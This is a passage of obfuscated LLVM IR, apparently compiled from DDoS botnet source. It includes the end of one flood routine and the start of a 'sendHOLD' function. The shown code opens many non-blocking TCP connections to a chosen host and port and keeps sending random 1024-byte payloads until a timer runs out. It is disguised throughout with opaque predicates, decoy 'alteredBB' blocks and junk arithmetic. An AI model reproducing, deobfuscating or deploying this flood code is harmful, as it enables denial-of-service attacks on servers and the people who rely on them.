  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  switch i32 %103, label %363 [
    i32 0, label %112
    i32 1, label %172
    i32 2, label %321
  ]

; <label>:112:                                    ; preds = %originalBBpart28
  %113 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %114 = load i32, i32* %16, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %115
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %116, i32 0, i32 0
  store i32 %113, i32* %117, align 8
  %118 = load i32, i32* %16, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %119
  %121 = getelementptr inbounds %struct.state_t, %struct.state_t* %120, i32 0, i32 0
  %122 = load i32, i32* %121, align 8
  %123 = load i32, i32* %16, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %124
  %126 = getelementptr inbounds %struct.state_t, %struct.state_t* %125, i32 0, i32 0
  %127 = load i32, i32* %126, align 8
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i8* null)
  %129 = or i32 %128, 2048
  %130 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 4, i32 %129)
  %131 = load i32, i32* %16, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %132
  %134 = getelementptr inbounds %struct.state_t, %struct.state_t* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 8
  %136 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %137 = call i32 @connect(i32 %135, %struct.sockaddr* %136, i32 16)
  %138 = icmp ne i32 %137, -1
  br i1 %138, label %143, label %139

; <label>:139:                                    ; preds = %112
  %140 = call i32* @__errno_location() #13
  %141 = load i32, i32* %140, align 4
  %142 = icmp ne i32 %141, 115
  br i1 %142, label %143, label %150

; <label>:143:                                    ; preds = %139, %112
  %144 = load i32, i32* %16, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %145
  %147 = getelementptr inbounds %struct.state_t, %struct.state_t* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 8
  %149 = call i32 @close(i32 %148)
  br label %155

; <label>:150:                                    ; preds = %139
  %151 = load i32, i32* %16, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %152
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %153, i32 0, i32 1
  store i8 1, i8* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %150, %143
  %156 = load i32, i32* @x.69
  %157 = load i32, i32* @y.70
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %155
  %164 = load i32, i32* @x.69
  %165 = load i32, i32* @y.70
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %363

; <label>:172:                                    ; preds = %originalBBpart28
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %175 = getelementptr inbounds [16 x i64], [16 x i64]* %174, i64 0, i64 0
  %176 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %175) #2, !srcloc !6
  %177 = extractvalue { i64, i64* } %176, 0
  %178 = extractvalue { i64, i64* } %176, 1
  %179 = trunc i64 %177 to i32
  store i32 %179, i32* %26, align 4
  %180 = ptrtoint i64* %178 to i64
  %181 = trunc i64 %180 to i32
  store i32 %181, i32* %27, align 4
  br label %182

; <label>:182:                                    ; preds = %173
  br label %183

; <label>:183:                                    ; preds = %182
  %184 = load i32, i32* @x.69
  %185 = load i32, i32* @y.70
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %183
  %192 = load i32, i32* %16, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %193
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 8
  %197 = srem i32 %196, 64
  %198 = zext i32 %197 to i64
  %199 = shl i64 1, %198
  %200 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %201 = load i32, i32* %16, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %202
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 8
  %206 = sdiv i32 %205, 64
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [16 x i64], [16 x i64]* %200, i64 0, i64 %207
  %209 = load i64, i64* %208, align 8
  %210 = or i64 %209, %199
  store i64 %210, i64* %208, align 8
  %211 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 0, i64* %211, align 8
  %212 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 10000, i64* %212, align 8
  %213 = load i32, i32* %16, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %214
  %216 = getelementptr inbounds %struct.state_t, %struct.state_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 8
  %218 = add nsw i32 %217, 1
  %219 = call i32 @select(i32 %218, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.__sigset_t* null, %struct.timeval* %20)
  store i32 %219, i32* %23, align 4
  %220 = load i32, i32* %23, align 4
  %221 = icmp eq i32 %220, 1
  %222 = load i32, i32* @x.69
  %223 = load i32, i32* @y.70
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBBpart253, label %originalBB14alteredBB

originalBBpart253:                                ; preds = %originalBB14
  br i1 %221, label %230, label %289

; <label>:230:                                    ; preds = %originalBBpart253
  store i32 4, i32* %21, align 4
  %231 = load i32, i32* %16, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %232
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 8
  %236 = bitcast i32* %22 to i8*
  %237 = call i32 @getsockopt(i32 %235, i32 1, i32 4, i8* %236, i32* %21) #2
  %238 = load i32, i32* %22, align 4
  %239 = icmp ne i32 %238, 0
  br i1 %239, label %240, label %267

; <label>:240:                                    ; preds = %230
  %241 = load i32, i32* @x.69
  %242 = load i32, i32* @y.70
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %240
  %249 = load i32, i32* %16, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %250
  %252 = getelementptr inbounds %struct.state_t, %struct.state_t* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 8
  %254 = call i32 @close(i32 %253)
  %255 = load i32, i32* %16, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %256
  %258 = getelementptr inbounds %struct.state_t, %struct.state_t* %257, i32 0, i32 1
  store i8 0, i8* %258, align 4
  %259 = load i32, i32* @x.69
  %260 = load i32, i32* @y.70
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %272

; <label>:267:                                    ; preds = %230
  %268 = load i32, i32* %16, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %269
  %271 = getelementptr inbounds %struct.state_t, %struct.state_t* %270, i32 0, i32 1
  store i8 2, i8* %271, align 4
  br label %272

; <label>:272:                                    ; preds = %267, %originalBBpart257
  %273 = load i32, i32* @x.69
  %274 = load i32, i32* @y.70
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %272
  %281 = load i32, i32* @x.69
  %282 = load i32, i32* @y.70
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %320

; <label>:289:                                    ; preds = %originalBBpart253
  %290 = load i32, i32* %23, align 4
  %291 = icmp eq i32 %290, -1
  br i1 %291, label %292, label %319

; <label>:292:                                    ; preds = %289
  %293 = load i32, i32* @x.69
  %294 = load i32, i32* @y.70
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %292
  %301 = load i32, i32* %16, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %302
  %304 = getelementptr inbounds %struct.state_t, %struct.state_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 8
  %306 = call i32 @close(i32 %305)
  %307 = load i32, i32* %16, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %308
  %310 = getelementptr inbounds %struct.state_t, %struct.state_t* %309, i32 0, i32 1
  store i8 0, i8* %310, align 4
  %311 = load i32, i32* @x.69
  %312 = load i32, i32* @y.70
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %319

; <label>:319:                                    ; preds = %originalBBpart265, %289
  br label %320

; <label>:320:                                    ; preds = %319, %originalBBpart261
  br label %363

; <label>:321:                                    ; preds = %originalBBpart28
  %322 = load i8*, i8** %24, align 8
  call void @makeRandomStr(i8* %322, i32 1024)
  %323 = load i32, i32* %16, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %324
  %326 = getelementptr inbounds %struct.state_t, %struct.state_t* %325, i32 0, i32 0
  %327 = load i32, i32* %326, align 8
  %328 = load i8*, i8** %24, align 8
  %329 = call i64 @send(i32 %327, i8* %328, i64 1024, i32 16384)
  %330 = icmp eq i64 %329, -1
  br i1 %330, label %331, label %362

; <label>:331:                                    ; preds = %321
  %332 = load i32, i32* @x.69
  %333 = load i32, i32* @y.70
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %331
  %340 = call i32* @__errno_location() #13
  %341 = load i32, i32* %340, align 4
  %342 = icmp ne i32 %341, 11
  %343 = load i32, i32* @x.69
  %344 = load i32, i32* @y.70
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %342, label %351, label %362

; <label>:351:                                    ; preds = %originalBBpart269
  %352 = load i32, i32* %16, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %353
  %355 = getelementptr inbounds %struct.state_t, %struct.state_t* %354, i32 0, i32 0
  %356 = load i32, i32* %355, align 8
  %357 = call i32 @close(i32 %356)
  %358 = load i32, i32* %16, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %359
  %361 = getelementptr inbounds %struct.state_t, %struct.state_t* %360, i32 0, i32 1
  store i8 0, i8* %361, align 4
  br label %362

; <label>:362:                                    ; preds = %351, %originalBBpart269, %321
  br label %363

; <label>:363:                                    ; preds = %362, %320, %originalBBpart212, %originalBBpart28
  br label %364

; <label>:364:                                    ; preds = %363
  %365 = load i32, i32* @x.69
  %366 = load i32, i32* @y.70
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %364
  %373 = load i32, i32* %16, align 4
  %374 = add nsw i32 %373, 1
  store i32 %374, i32* %16, align 4
  %375 = load i32, i32* @x.69
  %376 = load i32, i32* @y.70
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart278, label %originalBB71alteredBB

originalBBpart278:                                ; preds = %originalBB71
  br label %85

; <label>:383:                                    ; preds = %85
  br label %64

; <label>:384:                                    ; preds = %originalBBpart24
  %385 = load i32, i32* @x.69
  %386 = load i32, i32* @y.70
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %384
  %393 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %393)
  %394 = load i32, i32* @x.69
  %395 = load i32, i32* @y.70
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %402

; <label>:402:                                    ; preds = %originalBBpart282, %47
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %403 = alloca i8*, align 8
  %404 = alloca i32, align 4
  %405 = alloca i32, align 4
  %406 = alloca i32, align 4
  %407 = alloca i32, align 4
  %408 = alloca %struct.sockaddr_in, align 4
  %409 = alloca i8*, align 8
  %410 = alloca %struct.__sigset_t, align 8
  %411 = alloca %struct.timeval, align 8
  %412 = alloca i32, align 4
  %413 = alloca i32, align 4
  %414 = alloca i32, align 4
  %415 = alloca i8*, align 8
  %416 = alloca i32, align 4
  %417 = alloca i32, align 4
  %418 = alloca i32, align 4
  store i8* %0, i8** %403, align 8
  store i32 %1, i32* %404, align 4
  store i32 %2, i32* %405, align 4
  %419 = call i32 @getdtablesize() #2
  %_ = sub i32 0, %419
  %gen = add i32 %_, 2
  %420 = sdiv i32 %419, 2
  store i32 %420, i32* %406, align 4
  %421 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 0
  store i16 2, i16* %421, align 4
  %422 = load i32, i32* %404, align 4
  %423 = trunc i32 %422 to i16
  %424 = call zeroext i16 @htons(i16 zeroext %423) #13
  %425 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 1
  store i16 %424, i16* %425, align 2
  %426 = load i8*, i8** %403, align 8
  %427 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 2
  %428 = call i32 @getHost(i8* %426, %struct.in_addr* %427)
  %429 = icmp ne i32 %428, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %64
  %430 = load i32, i32* %25, align 4
  %431 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %432 = icmp sgt i32 %430, %431
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  %433 = load i32, i32* %16, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %434
  %436 = getelementptr inbounds %struct.state_t, %struct.state_t* %435, i32 0, i32 1
  %437 = load i8, i8* %436, align 4
  %438 = zext i8 %437 to i32
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %155
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %183
  %439 = load i32, i32* %16, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %440
  %442 = getelementptr inbounds %struct.state_t, %struct.state_t* %441, i32 0, i32 0
  %443 = load i32, i32* %442, align 8
  %_15 = shl i32 %443, 64
  %_16 = sub i32 %443, 64
  %gen17 = mul i32 %_16, 64
  %_18 = sub i32 %443, 64
  %gen19 = mul i32 %_18, 64
  %_20 = sub i32 0, %443
  %gen21 = add i32 %_20, 64
  %444 = srem i32 %443, 64
  %445 = zext i32 %444 to i64
  %_22 = shl i64 1, %445
  %_23 = sub i64 1, %445
  %gen24 = mul i64 %_23, %445
  %_25 = sub i64 1, %445
  %gen26 = mul i64 %_25, %445
  %_27 = sub i64 0, 1
  %gen28 = add i64 %_27, %445
  %_29 = sub i64 0, 1
  %gen30 = add i64 %_29, %445
  %446 = shl i64 1, %445
  %447 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %448 = load i32, i32* %16, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %449
  %451 = getelementptr inbounds %struct.state_t, %struct.state_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 8
  %_31 = sub i32 %452, 64
  %gen32 = mul i32 %_31, 64
  %453 = sdiv i32 %452, 64
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds [16 x i64], [16 x i64]* %447, i64 0, i64 %454
  %456 = load i64, i64* %455, align 8
  %_33 = shl i64 %456, %446
  %_34 = sub i64 %456, %446
  %gen35 = mul i64 %_34, %446
  %_36 = sub i64 %456, %446
  %gen37 = mul i64 %_36, %446
  %_38 = sub i64 %456, %446
  %gen39 = mul i64 %_38, %446
  %457 = or i64 %456, %446
  store i64 %457, i64* %455, align 8
  %458 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 0, i64* %458, align 8
  %459 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 10000, i64* %459, align 8
  %460 = load i32, i32* %16, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %461
  %463 = getelementptr inbounds %struct.state_t, %struct.state_t* %462, i32 0, i32 0
  %464 = load i32, i32* %463, align 8
  %_40 = sub i32 0, %464
  %gen41 = add i32 %_40, 1
  %_42 = shl i32 %464, 1
  %_43 = shl i32 %464, 1
  %_44 = sub i32 %464, 1
  %gen45 = mul i32 %_44, 1
  %_46 = sub i32 0, %464
  %gen47 = add i32 %_46, 1
  %_48 = sub i32 0, %464
  %gen49 = add i32 %_48, 1
  %_50 = sub i32 0, %464
  %gen51 = add i32 %_50, 1
  %465 = add nsw i32 %464, 1
  %466 = call i32 @select(i32 %465, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.__sigset_t* null, %struct.timeval* %20)
  store i32 %466, i32* %23, align 4
  %467 = load i32, i32* %23, align 4
  %468 = icmp eq i32 %467, 1
  br label %originalBB14

originalBB55alteredBB:                            ; preds = %originalBB55, %240
  %469 = load i32, i32* %16, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %470
  %472 = getelementptr inbounds %struct.state_t, %struct.state_t* %471, i32 0, i32 0
  %473 = load i32, i32* %472, align 8
  %474 = call i32 @close(i32 %473)
  %475 = load i32, i32* %16, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %476
  %478 = getelementptr inbounds %struct.state_t, %struct.state_t* %477, i32 0, i32 1
  store i8 0, i8* %478, align 4
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %272
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %292
  %479 = load i32, i32* %16, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %480
  %482 = getelementptr inbounds %struct.state_t, %struct.state_t* %481, i32 0, i32 0
  %483 = load i32, i32* %482, align 8
  %484 = call i32 @close(i32 %483)
  %485 = load i32, i32* %16, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %486
  %488 = getelementptr inbounds %struct.state_t, %struct.state_t* %487, i32 0, i32 1
  store i8 0, i8* %488, align 4
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %331
  %489 = call i32* @__errno_location() #13
  %490 = load i32, i32* %489, align 4
  %491 = icmp ne i32 %490, 11
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %364
  %492 = load i32, i32* %16, align 4
  %_72 = sub i32 0, %492
  %gen73 = add i32 %_72, 1
  %_74 = sub i32 %492, 1
  %gen75 = mul i32 %_74, 1
  %_76 = shl i32 %492, 1
  %493 = add nsw i32 %492, 1
  store i32 %493, i32* %16, align 4
  br label %originalBB71

originalBB80alteredBB:                            ; preds = %originalBB80, %384
  %494 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %494)
  br label %originalBB80
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %50

; <label>:33:                                     ; preds = %3
  %34 = load i32, i32* @x.71
  %35 = load i32, i32* @y.72
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* @x.71
  %43 = load i32, i32* @y.72
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %400

; <label>:50:                                     ; preds = %3
  %51 = load i32, i32* @x.71
  %52 = load i32, i32* @y.72
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %60 = getelementptr inbounds [8 x i8], [8 x i8]* %59, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 8, i32 4, i1 false)
  %61 = load i32, i32* %7, align 4
  %62 = zext i32 %61 to i64
  %63 = call i8* @llvm.stacksave()
  store i8* %63, i8** %10, align 8
  %64 = alloca %struct.state_t, i64 %62, align 16
  %65 = bitcast %struct.state_t* %64 to i8*
  %66 = load i32, i32* %7, align 4
  %67 = sext i32 %66 to i64
  %68 = mul i64 %67, 5
  call void @llvm.memset.p0i8.i64(i8* %65, i8 0, i64 %68, i32 16, i1 false)
  %69 = call noalias i8* @malloc(i64 1024) #2
  store i8* %69, i8** %16, align 8
  %70 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 1024, i32 1, i1 false)
  %71 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %72 = load i32, i32* %6, align 4
  %73 = add nsw i32 %71, %72
  store i32 %73, i32* %17, align 4
  %74 = load i32, i32* @x.71
  %75 = load i32, i32* @y.72
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart222, label %originalBB1alteredBB

originalBBpart222:                                ; preds = %originalBB1
  br label %82

; <label>:82:                                     ; preds = %397, %originalBBpart222
  %83 = load i32, i32* %17, align 4
  %84 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %85 = icmp sgt i32 %83, %84
  br i1 %85, label %86, label %398

; <label>:86:                                     ; preds = %82
  store i32 0, i32* %8, align 4
  br label %87

; <label>:87:                                     ; preds = %394, %86
  %88 = load i32, i32* %8, align 4
  %89 = load i32, i32* %7, align 4
  %90 = icmp slt i32 %88, %89
  br i1 %90, label %91, label %397

; <label>:91:                                     ; preds = %87
  %92 = load i32, i32* @x.71
  %93 = load i32, i32* @y.72
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %91
  %100 = load i32, i32* %8, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %101
  %103 = getelementptr inbounds %struct.state_t, %struct.state_t* %102, i32 0, i32 1
  %104 = load i8, i8* %103, align 4
  %105 = zext i8 %104 to i32
  %106 = load i32, i32* @x.71
  %107 = load i32, i32* @y.72
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  switch i32 %105, label %393 [
    i32 0, label %114
    i32 1, label %174
    i32 2, label %323
  ]

; <label>:114:                                    ; preds = %originalBBpart226
  %115 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %116 = load i32, i32* %8, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %117
